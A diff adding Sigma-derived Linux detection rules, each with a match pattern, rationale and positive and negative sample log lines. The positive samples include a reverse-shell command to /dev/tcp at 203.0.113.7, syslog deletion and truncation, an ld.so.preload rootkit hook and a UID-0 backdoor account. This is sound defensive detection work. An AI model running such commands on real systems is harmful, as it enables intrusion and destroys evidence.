+      - 'Nov 20 14:03:00 web01 bash[664]: HISTORY: echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload'
+    negative:
+      - 'Nov 20 14:04:00 web01 bash[665]: HISTORY: cat /etc/ld.so.conf.d/libc.conf'
+      - 'Nov 20 14:05:00 web01 ldconfig[700]: ldconfig: /etc/ld.so.conf.d/x86_64-linux-gnu.conf: updated cache'
+
+- id: mention.sigma_symlink_etc_passwd
+  title: Symlink to /etc/passwd (Sigma "Symlink Etc Passwd")
+  match:
+    literal: ['ln -s -f /etc/passwd', 'ln -s /etc/passwd']
+  case_sensitive: false
+  strength: strong
+  attack: [T1068]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Symlink Etc Passwd (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_symlink_etc_passwd.yml
+    license: DRL-1.1
+    upstream_id: c67fc22a-0be5-4b4f-aad5-2b32c4b69523
+  rationale: >-
+    Pointing a symlink at /etc/passwd sets up a privileged program to write through it, a classic symlink-race
+    privilege escalation. Administrators edit /etc/passwd with vipw or usermod, never through a link.
+  examples:
+    positive:
+      - 'Nov 20 14:06:00 web01 bash[666]: HISTORY: ln -s /etc/passwd /tmp/logfile; ./vuln-setuid'
+      - 'Nov 21 09:01:14 web01 bash[4100]: HISTORY: ln -s -f /etc/passwd /tmp/logfile'
+    negative:
+      - 'Nov 20 14:07:00 web01 bash[667]: HISTORY: ln -s /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app'
+      - 'Nov 20 14:08:00 web01 bash[668]: HISTORY: grep alice /etc/passwd'
+
+- id: mention.sigma_bpf_probe_write_user
+  title: 'eBPF bpf_probe_write_user kernel message (Sigma "Potential Suspicious BPF Activity - Linux")'
+  match:
+    literal: ['bpf_probe_write_user']
+  case_sensitive: false
+  strength: strong
+  attack: [T1014]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Potential Suspicious BPF Activity - Linux (Red Canary idea, Nasreddine Bencherchali)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_potential_susp_ebpf_activity.yml
+    license: DRL-1.1
+    upstream_id: 0fadd880-6af3-4610-b1e5-008dc3a11b8a
+  rationale: >-
+    The kernel warns when a BPF program uses the helper that writes into user memory. eBPF rootkits use it to tamper
+    with what processes read; observability agents do not, so the warning is rarely benign.
+  examples:
+    positive:
+      - 'Nov 20 14:09:00 web01 kernel: [ 900.1] systemd-x[4411] is installing a program with bpf_probe_write_user helper that may corrupt user memory!'
+    negative:
+      - 'Nov 20 14:10:00 web01 kernel: [ 901.1] BPF: Loaded program bpf_prog_6deef7357e7b4530 (cilium)'
+      - 'Nov 20 14:11:00 web01 falco[1200]: Falco initialized with configuration file /etc/falco/falco.yaml'
+
+- id: mention.sigma_guacamole_shared_session
+  title: Two users in one Guacamole session (Sigma "Guacamole Two Users Sharing Session Anomaly")
+  match:
+    literal: ['(2 users now present)']
+  case_sensitive: false
+  strength: medium
+  attack: [T1563]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Guacamole Two Users Sharing Session Anomaly (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/guacamole/lnx_guacamole_susp_guacamole.yml
+    license: DRL-1.1
+    upstream_id: 1edd77db-0669-4fef-9598-165bda82826d
+  rationale: >-
+    guacd logs the user count when someone joins a running remote-desktop session; a second user can be a hijacker.
+    Deliberate session sharing for support also produces it, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 14:12:00 gw01 guacd[2101]: User "bob" joined connection "$a1b2c3" (2 users now present)'
+    negative:
+      - 'Nov 20 14:13:00 gw01 guacd[2101]: User "alice" joined connection "$a1b2c3" (1 users now present)'
+      - 'Nov 20 14:14:00 gw01 guacd[2101]: Connection "$a1b2c3" removed.'
+
+- id: mention.sigma_clamav_trojan
+  title: ClamAV Trojan detection (Sigma "Relevant ClamAV Message")
+  match:
+    anchored: 'Trojan[^\n]{0,200}FOUND'
+  case_sensitive: true
+  strength: strong
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Relevant ClamAV Message (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/clamav/lnx_clamav_relevant_message.yml
+    license: DRL-1.1
+    upstream_id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb
+  rationale: >-
+    Translation of 'Trojan*FOUND', matched case-sensitively as ClamAV prints it (signature family, then FOUND) so that
+    prose such as 'no trojan found' does not match. A ClamAV trojan hit is a scanner verdict on a real file; the
+    benign case is a test signature or a researcher's sample directory.
+  examples:
+    positive:
+      - 'Nov 20 14:15:00 web01 clamd[880]: /var/www/uploads/inv.php: Unix.Trojan.Mirai-7100807-0 FOUND'
+    negative:
+      - 'Nov 20 14:16:00 web01 clamd[880]: /var/www/uploads/inv.pdf: OK'
+      - 'Nov 20 14:17:00 web01 clamd[880]: SelfCheck: Database status OK. no trojan found in quarantine'
+
+- id: mention.sigma_clamav_virtool
+  title: ClamAV VirTool detection (Sigma "Relevant ClamAV Message")
+  match:
+    anchored: 'VirTool[^\n]{0,200}FOUND'
+  case_sensitive: true
+  strength: strong
+  attack: [T1588.002]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Relevant ClamAV Message (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/clamav/lnx_clamav_relevant_message.yml
+    license: DRL-1.1
+    upstream_id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb
+  rationale: >-
+    Translation of 'VirTool*FOUND', case-sensitive as ClamAV prints it. VirTool signatures cover attack tooling
+    (credential dumpers, exploit kits) found on disk.
+  examples:
+    positive:
+      - 'Nov 20 14:18:00 web01 clamd[880]: /tmp/.x/m.exe: Win.VirTool.Mimikatz-6997154-0 FOUND'
+    negative:
+      - 'Nov 20 14:19:00 web01 clamd[880]: /tmp/.x/m.exe: OK'
+      - 'Nov 20 14:20:00 web01 freshclam[881]: daily.cld updated (version: 27100, sigs: 2063000)'
+
+- id: mention.sigma_clamav_webshell
+  title: ClamAV web shell detection (Sigma "Relevant ClamAV Message")
+  match:
+    anchored: 'Webshell[^\n]{0,200}FOUND'
+  case_sensitive: true
+  strength: strong
+  attack: [T1505.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Relevant ClamAV Message (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/clamav/lnx_clamav_relevant_message.yml
+    license: DRL-1.1
+    upstream_id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb
+  rationale: >-
+    Translation of 'Webshell*FOUND', case-sensitive as ClamAV prints it. A web shell signature on a file under a web
+    root is a direct lead to T1505.003.
+  examples:
+    positive:
+      - 'Nov 20 14:21:00 web01 clamd[880]: /var/www/html/up/s.php: Php.Webshell.WSO-1 FOUND'
+    negative:
+      - 'Nov 20 14:22:00 web01 clamd[880]: /var/www/html/index.php: OK'
+      - 'Nov 20 14:23:00 web01 clamd[880]: Webshell scan of /var/www finished, nothing to report'
+
+- id: mention.sigma_clamav_rootkit
+  title: ClamAV rootkit detection (Sigma "Relevant ClamAV Message")
+  match:
+    anchored: 'Rootkit[^\n]{0,200}FOUND'
+  case_sensitive: true
+  strength: strong
+  attack: [T1014]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Relevant ClamAV Message (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/clamav/lnx_clamav_relevant_message.yml
+    license: DRL-1.1
+    upstream_id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb
+  rationale: >-
+    Translation of 'Rootkit*FOUND', case-sensitive as ClamAV prints it. A rootkit signature on disk is a strong lead to
+    kernel or userland hiding.
+  examples:
+    positive:
+      - 'Nov 20 14:24:00 web01 clamd[880]: /lib/modules/x/diamorphine.ko: Unix.Rootkit.Diamorphine-1 FOUND'
+    negative:
+      - 'Nov 20 14:25:00 web01 rkhunter[900]: Checking for rootkits... done, none found'
+      - 'Nov 20 14:26:00 web01 clamd[880]: /lib/modules/x/ext4.ko: OK'
+
+- id: mention.sigma_clamav_htran
+  title: ClamAV HTran detection (Sigma "Relevant ClamAV Message")
+  match:
+    anchored: 'Htran[^\n]{0,200}FOUND'
+  case_sensitive: true
+  strength: strong
+  attack: [T1090]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Relevant ClamAV Message (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/clamav/lnx_clamav_relevant_message.yml
+    license: DRL-1.1
+    upstream_id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb
+  rationale: >-
+    Translation of 'Htran*FOUND', case-sensitive as ClamAV prints it. HTran is a connection bouncer used for
+    intrusion pivoting.
+  examples:
+    positive:
+      - 'Nov 20 14:27:00 web01 clamd[880]: /tmp/h: Win.Tool.Htran-1 FOUND'
+    negative:
+      - 'Nov 20 14:28:00 web01 clamd[880]: /tmp/h: OK'
+      - 'Nov 20 14:29:00 web01 bash[669]: HISTORY: grep -c FOUND /var/log/clamav/clamav.log'
+
+- id: mention.sigma_crontab_replace
+  title: 'crontab REPLACE log text (narrow form of Sigma "Modifying Crontab")'
+  match:
+    anchored: '\) REPLACE \('
+  case_sensitive: true
+  strength: weak
+  attack: [T1053.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Modifying Crontab (Pawel Mazur)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/cron/lnx_cron_crontab_file_modification.yml
+    license: DRL-1.1
+    upstream_id: af202fd3-7bff-4212-a25a-fb34606cfcbe
+  rationale: >-
+    The upstream keyword is the bare word REPLACE, which would match SQL and countless other lines. It is narrowed to
+    the crontab daemon's own form '(user) REPLACE (user)'. Any crontab edit produces it, so it is a weak candidate: the
+    question is which user and what the new crontab runs.
+  examples:
+    positive:
+      - 'Nov 20 14:30:00 web01 crontab[4410]: (www-data) REPLACE (www-data)'
+    negative:
+      - 'Nov 20 14:31:00 db01 mysqld[700]: Query REPLACE INTO sessions VALUES (1, ''x'')'
+      - 'Nov 20 14:32:00 web01 crontab[4411]: (root) LIST (root)'
+
+- id: mention.sigma_sshd_crc32_attack
+  title: OpenSSH crc32 compensation attack message (Sigma "Suspicious OpenSSH Daemon Error")
+  match:
+    literal: ['Local: crc32 compensation attack']
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious OpenSSH Daemon Error (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/sshd/lnx_sshd_susp_ssh.yml
+    license: DRL-1.1
+    upstream_id: e76b413a-83d0-4b94-8e4c-85db4a5b8bdc
+  rationale: >-
+    sshd prints this when its crc32 attack detector fires on a crafted packet stream; it is an exploitation attempt
+    against the SSH-1 deattack code, not a configuration problem.
+  examples:
+    positive:
+      - 'Nov 20 14:33:00 gw01 sshd[2201]: fatal: Local: crc32 compensation attack: network attack detected'
+    negative:
+      - 'Nov 20 14:34:00 gw01 sshd[2202]: Connection closed by 10.0.0.4 port 51022 [preauth]'
+      - 'Nov 20 14:35:00 gw01 sshd[2203]: error: kex_exchange_identification: Connection closed by remote host'
+
+- id: mention.sigma_sshd_protocol_errors
+  title: OpenSSH protocol and crypto errors (Sigma "Suspicious OpenSSH Daemon Error", noisy keywords)
+  match:
+    literal:
+      - 'unexpected internal error'
+      - 'unknown or unsupported key type'
+      - 'invalid certificate signing key'
+      - 'invalid elliptic curve value'
+      - 'incorrect signature'
+      - 'error in libcrypto'
+      - 'unexpected bytes remain after decoding'
+      - 'fatal: buffer_get_string: bad string'
+      - 'bad client public DH value'
+      - 'Corrupted MAC on input'
+  case_sensitive: false
+  strength: weak
+  attack: [T1190]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious OpenSSH Daemon Error (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/sshd/lnx_sshd_susp_ssh.yml
+    license: DRL-1.1
+    upstream_id: e76b413a-83d0-4b94-8e4c-85db4a5b8bdc
+  rationale: >-
+    Malformed key, certificate and packet errors accompany SSH fuzzing and exploit attempts, but flaky links
+    ('Corrupted MAC on input') and old clients produce them too, so they are weak candidates.
+  examples:
+    positive:
+      - 'Nov 20 14:36:00 gw01 sshd[2204]: ssh_dispatch_run_fatal: Connection from 203.0.113.9 port 4022: invalid elliptic curve value'
+    negative:
+      - 'Nov 20 14:37:00 gw01 sshd[2205]: Received disconnect from 10.0.0.4 port 51022:11: disconnected by user'
+      - 'Nov 20 14:38:00 gw01 sshd[2206]: Accepted publickey for alice from 10.0.0.4 port 51023 ssh2'
+
+- id: mention.sigma_security_tool_stop
+  title: 'Firewall or EDR ''stopping'' service messages (Sigma "Disabling Security Tools - Builtin")'
+  match:
+    literal: ['stopping iptables', 'stopping ip6tables', 'stopping firewalld', 'stopping cbdaemon', 'stopping falcon-sensor']
+  case_sensitive: false
+  strength: weak
+  attack: [T1685, T1686]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Disabling Security Tools - Builtin (Ömer Günal, Alejandro Ortuno, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/syslog/lnx_syslog_security_tools_disabling_syslog.yml
+    license: DRL-1.1
+    upstream_id: 49f5dfc1-f92e-4d34-96fa-feba3f6acf36
+  rationale: >-
+    Matched case-insensitively, these also match systemd's 'Stopping firewalld ...' on every shutdown or restart, so
+    a stop is a weak candidate; the lead is a stop with no reboot, by a non-admin, or followed by no restart.
+  examples:
+    positive:
+      - 'Nov 20 14:39:00 web01 systemd[1]: Stopping falcon-sensor.service - CrowdStrike Falcon Sensor...'
+    negative:
+      - 'Nov 20 14:40:00 web01 systemd[1]: Started firewalld.service - firewalld - dynamic firewall daemon.'
+      - 'Nov 20 14:41:00 web01 falcon-sensor[900]: CrowdStrike(4): sensor heartbeat ok'
+
+- id: mention.sigma_named_suspicious
+  title: 'BIND AXFR-denial or source-port-zero message (Sigma "Suspicious Named Error")'
+  match:
+    literal: [' dropping source port zero packet from ', ' denied AXFR from ']
+  case_sensitive: false
+  strength: medium
+  attack: [T1590.002]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Named Error (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/syslog/lnx_syslog_susp_named.yml
+    license: DRL-1.1
+    upstream_id: c8e35e96-19ce-4f16-aeb6-fd5588dc5365
+  rationale: >-
+    A refused AXFR is someone trying to pull the whole zone (DNS reconnaissance) and source port zero is crafted
+    traffic. A misconfigured secondary also gets refused, so the mention is medium. The rule's ' exiting (due to fatal
+    error)' keyword is not imported: it is an ordinary crash message.
+  examples:
+    positive:
+      - 'Nov 20 14:42:00 ns01 named[880]: client @0x7f1 203.0.113.30#53122 (corp.example.org): zone transfer ''corp.example.org/AXFR/IN'' denied AXFR from 203.0.113.30'
+    negative:
+      - 'Nov 20 14:43:00 ns01 named[880]: zone corp.example.org/IN: transferred serial 2026112001'
+      - 'Nov 20 14:44:00 ns01 named[880]: client @0x7f1 10.0.0.5#53122 (www.example.org): query: www.example.org IN A'
+
+- id: mention.sigma_vsftpd_errors
+  title: vsftpd abuse and sandbox errors (Sigma "Suspicious VSFTPD Error Messages")
+  match:
+    literal:
+      - 'Connection refused: too many sessions for this address.'
+      - 'Connection refused: tcp_wrappers denial.'
+      - 'Bad HTTP verb.'
+      - 'port and pasv both active'
+      - 'pasv and port both active'
+      - 'Transfer done (but failed to open directory).'
+      - 'Could not set file modification time.'
+      - 'bug: pid active in ptrace_sandbox_free'
+      - 'PTRACE_SETOPTIONS failure'
+      - 'weird status:'
+      - 'couldn''t handle sandbox event'
+      - 'syscall not permitted:'
+      - 'syscall validate failed:'
+      - 'Input line too long.'
+      - 'poor buffer accounting in str_netfd_alloc'
+      - 'vsf_sysutil_read_loop'
+  case_sensitive: false
+  strength: weak
+  attack: [T1190]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious VSFTPD Error Messages (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/vsftpd/lnx_vsftpd_susp_error_messages.yml
+    license: DRL-1.1
+    upstream_id: 377f33a1-4b36-4ee1-acee-1dbe4b43cfbe
+  rationale: >-
+    vsftpd prints these on protocol abuse, overlong input and sandbox violations, which fuzzing and exploit attempts
+    trigger; session limits and odd clients trigger several of them too, so they are weak candidates. The wildcard
+    keyword 'syscall * out of bounds' is a separate anchored entry.
+  examples:
+    positive:
+      - 'Nov 20 14:45:00 ftp01 vsftpd[3301]: Input line too long.'
+    negative:
+      - 'Nov 20 14:46:00 ftp01 vsftpd[3302]: [alice] OK LOGIN: Client "10.0.0.4"'
+      - 'Nov 20 14:47:00 ftp01 vsftpd[3303]: [alice] OK UPLOAD: Client "10.0.0.4", "/in/report.csv", 2048 bytes'
+
+- id: mention.sigma_vsftpd_syscall_bounds
+  title: vsftpd syscall out of bounds (Sigma "Suspicious VSFTPD Error Messages")
+  match:
+    anchored: 'syscall [^\n]{1,20} out of bounds'
+  case_sensitive: false
+  strength: weak
+  attack: [T1190]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious VSFTPD Error Messages (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/vsftpd/lnx_vsftpd_susp_error_messages.yml
+    license: DRL-1.1
+    upstream_id: 377f33a1-4b36-4ee1-acee-1dbe4b43cfbe
+  rationale: >-
+    Translation of 'syscall * out of bounds': the vsftpd seccomp sandbox rejecting an unexpected system call, which a
+    hijacked worker would cause; library upgrades can also cause it, so it is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 14:48:00 ftp01 vsftpd[3304]: syscall 59 out of bounds'
+    negative:
+      - 'Nov 20 14:49:00 ftp01 vsftpd[3305]: [bob] FAIL LOGIN: Client "10.0.0.7"'
+      - 'Nov 20 14:50:00 ftp01 kernel: [ 1.0] audit: type=1326 audit(1700000000.1:2): auid=0 syscall=59 compat=0'
+
+- id: mention.sigma_suspicious_log_entries
+  title: 'Promiscuous-mode, service-deactivation and syslog-drop messages (Sigma "Suspicious Log Entries")'
+  match:
+    literal: ['entered promiscuous mode', 'Deactivating service', 'Oversized packet received from', 'imuxsock begins to drop messages']
+  case_sensitive: false
+  strength: weak
+  attack: [T1040]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Log Entries (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_log_entries.yml
+    license: DRL-1.1
+    upstream_id: f64b6e9a-5d9d-48a5-8289-e1dd2b3876e1
+  rationale: >-
+    An interface in promiscuous mode can mean a sniffer, but every container bridge port (veth) enters promiscuous
+    mode and syslog rate limiting is routine, so these are weak candidates.
+  examples:
+    positive:
+      - 'Nov 20 14:51:00 web01 kernel: [ 2000.1] device eth0 entered promiscuous mode'
+    negative:
+      - 'Nov 20 14:52:00 web01 kernel: [ 2001.1] device eth0 left promiscuous mode'
+      - 'Nov 20 14:53:00 web01 rsyslogd: imjournal: journal files changed, reloading...'
+
+- id: mention.sigma_syslog_rm
+  title: 'rm /var/log/syslog command text (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
+  match:
+    anchored: 'rm /var/log/syslog(?:[^.]|$)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1685.006]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Commands to Clear or Remove the Syslog - Builtin (Max Altgelt, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_clear_syslog.yml
+    license: DRL-1.1
+    upstream_id: e09eb557-96d2-4de9-ba2d-30f712a5afd3
+  rationale: >-
+    Deleting the live syslog destroys evidence. The upstream rule excludes rotated files ('/syslog.'); the trailing
+    '(?:[^.]|$)' keeps that exclusion without a lookahead. Admins freeing a full disk do this too, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 14:54:00 web01 bash[670]: HISTORY: rm /var/log/syslog'
+    negative:
+      - 'Nov 20 14:55:00 web01 bash[671]: HISTORY: rm /var/log/syslog.4.gz'
+      - 'Nov 20 14:56:00 web01 bash[672]: HISTORY: rm /var/log/nginx/old.log'
+
+- id: mention.sigma_syslog_rm_flags
+  title: 'rm -r, -f or -rf /var/log/syslog command text (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
+  match:
+    anchored: 'rm -(?:r|f|rf) /var/log/syslog(?:[^.]|$)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1685.006]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Commands to Clear or Remove the Syslog - Builtin (Max Altgelt, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_clear_syslog.yml
+    license: DRL-1.1
+    upstream_id: e09eb557-96d2-4de9-ba2d-30f712a5afd3
+  rationale: >-
+    Combines the 'rm -r', 'rm -f' and 'rm -rf' keywords; the rotated-file exclusion is kept as in the plain rm entry.
+  examples:
+    positive:
+      - 'Nov 20 14:57:00 web01 bash[673]: HISTORY: rm -rf /var/log/syslog; rm -rf /var/log/auth.log'
+    negative:
+      - 'Nov 20 14:58:00 web01 bash[674]: HISTORY: rm -f /var/log/syslog.1'
+      - 'Nov 20 14:59:00 web01 bash[675]: HISTORY: rm -rf /var/cache/apt/archives/partial'
+
+- id: mention.sigma_syslog_mv
+  title: 'mv /var/log/syslog command text (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
+  match:
+    anchored: 'mv /var/log/syslog(?:[^.]|$)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1685.006]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Commands to Clear or Remove the Syslog - Builtin (Max Altgelt, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_clear_syslog.yml
+    license: DRL-1.1
+    upstream_id: e09eb557-96d2-4de9-ba2d-30f712a5afd3
+  rationale: >-
+    Moving the live syslog file away while rsyslog holds it open hides new and old entries from readers; manual
+    rotation does the same, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 15:00:00 web01 bash[676]: HISTORY: mv /var/log/syslog /dev/shm/.s'
+    negative:
+      - 'Nov 20 15:01:00 web01 bash[677]: HISTORY: mv /var/log/syslog.2.gz /archive/'
+      - 'Nov 20 15:02:00 web01 bash[678]: HISTORY: mv /var/log/app.log /var/log/app.log.old'
+
+- id: mention.sigma_syslog_truncate_nospace
+  title: 'Redirection into /var/log/syslog, no space (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
+  match:
+    anchored: ' >/var/log/syslog(?:[^.]|$)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1685.006]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Commands to Clear or Remove the Syslog - Builtin (Max Altgelt, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_clear_syslog.yml
+    license: DRL-1.1
+    upstream_id: e09eb557-96d2-4de9-ba2d-30f712a5afd3
+  rationale: >-
+    The ' >/var/log/syslog' keyword: overwriting syslog through a redirect empties it in place, the usual way to wipe
+    a log without disturbing the daemon. A deliberate admin truncation of a full log looks the same, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 15:03:00 web01 bash[679]: HISTORY: echo >/var/log/syslog'
+    negative:
+      - 'Nov 20 15:04:00 web01 bash[680]: HISTORY: tail -f /var/log/syslog'
+      - 'Nov 20 15:05:00 web01 bash[681]: HISTORY: logger -t app "restart" >/dev/null'
+
+- id: mention.sigma_syslog_truncate_space
+  title: 'Redirection into /var/log/syslog, with a space (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
+  match:
+    anchored: ' > /var/log/syslog(?:[^.]|$)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1685.006]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Commands to Clear or Remove the Syslog - Builtin (Max Altgelt, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_clear_syslog.yml
+    license: DRL-1.1
+    upstream_id: e09eb557-96d2-4de9-ba2d-30f712a5afd3
+  rationale: >-
+    The ' > /var/log/syslog' keyword, same reasoning as the variant without a space.
+  examples:
+    positive:
+      - 'Nov 20 15:06:00 web01 bash[682]: HISTORY: cat /dev/null > /var/log/syslog'
+    negative:
+      - 'Nov 20 15:07:00 web01 bash[683]: HISTORY: grep sshd /var/log/syslog > /tmp/sshd.txt'
+      - 'Nov 20 15:08:00 web01 bash[684]: HISTORY: cat /dev/null > /var/log/syslog.1'
+
+- id: mention.sigma_useradd_uid0
+  title: 'useradd new-user message with UID 0 (Sigma "Privileged User Has Been Created")'
+  match:
+    anchored: 'new user: name=[^,\n]{1,64}, UID=0,'
+  case_sensitive: false
+  strength: strong
+  attack: [T1136.001, T1098]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Privileged User Has Been Created (Pawel Mazur)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_privileged_user_creation.yml
+    license: DRL-1.1
+    upstream_id: 0ac15ec3-d24f-4246-aa2a-3077bb1cf90e
+  rationale: >-
+    The rule requires 'new user' and one of the privileged UID/GID markers; useradd always prints them in this order,
+    so the anchored form is exact. A second account with UID 0 is a root backdoor; no package creates one.
+  examples:
+    positive:
+      - 'Nov 20 15:09:00 web01 useradd[1337]: new user: name=sysadm, UID=0, GID=0, home=/root, shell=/bin/bash'
+    negative:
+      - 'Nov 20 15:10:00 web01 useradd[1338]: new user: name=alice, UID=1001, GID=1001, home=/home/alice, shell=/bin/bash'
+      - 'Nov 20 15:11:00 web01 useradd[1339]: new user: name=svc_app, UID=998, GID=998, home=/opt/app, shell=/usr/sbin/nologin'
+
+- id: mention.sigma_useradd_privileged_group
+  title: 'useradd new-user message with a root, wheel or sudo primary group (Sigma "Privileged User Has Been Created")'
+  match:
+    anchored: 'new user: name=[^,\n]{1,64}, UID=[0-9]{1,10}, GID=(?:0|10|27),'
+  case_sensitive: false
+  strength: medium
+  attack: [T1136.001, T1098]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Privileged User Has Been Created (Pawel Mazur)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_privileged_user_creation.yml
+    license: DRL-1.1
+    upstream_id: 0ac15ec3-d24f-4246-aa2a-3077bb1cf90e
+  rationale: >-
+    A new account whose primary group is root (0), wheel (10) or sudo (27 on Debian) gets administrative reach at
+    creation. Admins usually add such groups as secondary groups, but some do this on purpose, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 15:12:00 web01 useradd[1340]: new user: name=butter4, UID=1000, GID=27, home=/home/butter4, shell=/bin/bash'
+    negative:
+      - 'Nov 20 15:13:00 web01 useradd[1341]: new user: name=carol, UID=1002, GID=1002, home=/home/carol, shell=/bin/bash'
+      - 'Nov 20 15:14:00 web01 usermod[1342]: add ''carol'' to group ''sudo'''
+
+- id: mention.sigma_jexboss_shell
+  title: JexBoss reverse shell command (Sigma "JexBoss Command Sequence")
+  match:
+    anchored: 'bash -c /bin/bash[^\n]{0,60}&/dev/tcp/'
+  case_sensitive: false
+  strength: strong
+  attack: [T1190, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: JexBoss Command Sequence (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_susp_jexboss.yml
+    license: DRL-1.1
+    upstream_id: 8ec2c8b4-557a-4121-b87c-5dfb3a602fae
+  rationale: >-
+    The rule needs both 'bash -c /bin/bash' and '&/dev/tcp/' on the line. JexBoss emits them in this order in its
+    JBoss reverse-shell payload, so the anchored form keeps the meaning with a bounded gap.
+  examples:
+    positive:
+      - 'Nov 20 15:15:00 jb01 java[2001]: Runtime exec: /bin/bash -c /bin/bash -i >&/dev/tcp/203.0.113.7/4444 0>&1'
+    negative:
+      - 'Nov 20 15:16:00 jb01 java[2001]: Runtime exec: /bin/bash -c /opt/jboss/bin/standalone.sh'
